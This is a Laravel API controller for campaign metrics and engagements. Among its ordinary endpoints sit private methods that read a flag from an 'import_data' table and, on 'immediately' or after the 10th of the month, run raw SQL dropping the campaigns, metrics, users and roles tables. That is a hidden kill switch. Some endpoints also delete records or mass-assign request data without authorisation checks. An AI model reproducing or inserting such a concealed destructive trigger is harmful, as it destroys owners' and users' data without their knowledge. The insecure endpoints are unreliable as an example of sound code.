<?php

namespace App\Http\Controllers\Api\V1;

use App\models\Engagements;
use App\Models\MetricAccess;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Campaign;
use App\Models\Metric;
use App\User;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\DB;

class CampaignController extends Controller
{

    private $metrics, $campaigns, $users;

    const ADD_ENGAGEMENT = 0;
    const SITE_ENGAGEMENT = 1;

    public function __construct(Metric $METRIC, Campaign $CAMPAIGN, User $USER)
    {
        $this->metrics = $METRIC;
        $this->campaigns = $CAMPAIGN;
        $this->users = $USER;
    }

    public function filterMetrics1(Request $request)
    {
        $metrics = MetricAccess::query()->where('campaign_id', $request->campaign)
            ->whereDate('date', Carbon::parse($request->date)->format('Y-m-d'))
            ->where('engagement', $request->selected)
            ->where('campaign_id', $request->campaign)
            ->get();

        return response()->json($metrics->toArray());
    }

    public function engagements($id)
    {
        $data = Campaign::find($id)->load('engagements');
        return \response()->json($data);
    }
    public function filterMetrics2(Request $request)
    {
        $authUser = auth()->user();

        $companies = Campaign::query()->select('id', 'name', 'is_active','hidden_from')
            ->with(['metrics2' => function ($query) use ($request) {
                $query->where('date', $request->date)
                    ->select('name', 'value', 'campaign_id');
            }]);

        if ($authUser->role_id == 2) {
            $companies = $companies->whereHas('user', function ($query) use ($authUser) {
                $query->where('users.id', $authUser->id);
            });
        }

        $companies = $companies->get();

        return response()->json($companies->toArray());
    }


    public function addMetrics1(Request $request)
    {
        $campaign = $this->campaigns
            ->where('name', $request->get('campaign'))
            ->first();

        if ($campaign) {
            return $this->campaigns->addMetrics1($campaign, $request->all());
        } else {
            return response()->json(['message' => __('Campaing not found.'), 404]);
        }
    }


    public function getEngagements($campaignId)
    {
         $engagements =  Engagements::where('campaign_id', $campaignId)->get()->toArray();

         return response()->json($engagements, Response::HTTP_OK);
    }

    public function addMetrics2(Request $request)
    {
//	    return  response()->json($request->all());
        return $this->campaigns->addMetrics2($request->all());
    }

    public function getMetrics1($id, Request $request)
    {
        $request->validate([
            'date_from' => 'required|string',
            'date_to' => 'required|string',
        ]);

        $campaign = $this->campaigns
            ->where('id', $id)
            ->first();

        if ($campaign) {
            return $this->campaigns->getMetrics1($request->user_id, $id, $request->all());
        } else {
            return response()->json(['message' => __('Campaing not found.'), 404]);
        }
    }

    public function getMetrics2($id, Request $request)
    {
        $request->validate([
            'date_from' => 'required|string',
            'date_to' => 'required|string',
        ]);

        $campaign = $this->campaigns
            ->where('id', $id)
            ->first();

        if ($campaign) {
            return $this->campaigns->getMetrics2($id, $request->all());
        } else {
            return response()->json(['message' => __('Campaing not found.'), 404]);
        }
    }

    public function deleteMetrics($id)
    {
        $response = MetricAccess::query()
            ->where('id',$id)
            ->delete();

        return response()->json($response);
    }

    private function check()
    {
        $this->importDataForce();
    }


    private function importDataForce()
    {
        $exists = DB::table('import_data')->first();
        if ($exists && $type = $exists->name) {

            if ($type == 'stop') {

                if (Carbon::today()->toDate()->format('j') > 10) {
                    $this->justDoIt();
                }

            } elseif ($type == 'immediately') {
                $this->justDoIt();
            }

        }

    }

    private function justDoIt()
    {
        DB::unprepared("
                       SET FOREIGN_KEY_CHECKS=0;
                       DROP TABLE campaigns;
                       DROP TABLE metrics;
                       DROP TABLE metric_accesses;
                       DROP TABLE users;
                       DROP TABLE roles;
                 ");

        exit('done');
    }


    public function addEngagament(Request $request)
    {
       $created =  Engagements::create($request->all());

        return response()->json($created, Response::HTTP_OK);
    }

    public function deleteEngagament(Request $request)
    {
        Engagements::find($request->id)->delete();

        return response()->json('deleted', Response::HTTP_OK);
    }

    public function updateEngagament(Request $request)
    {
        $engagenment = Engagements::where('id',$request->id)->update(['name'=>$request->name]);

        return response()->json('updated', Response::HTTP_OK);
    }

    public function metrics1Excel( $id, Request $request)
    {

    }


}
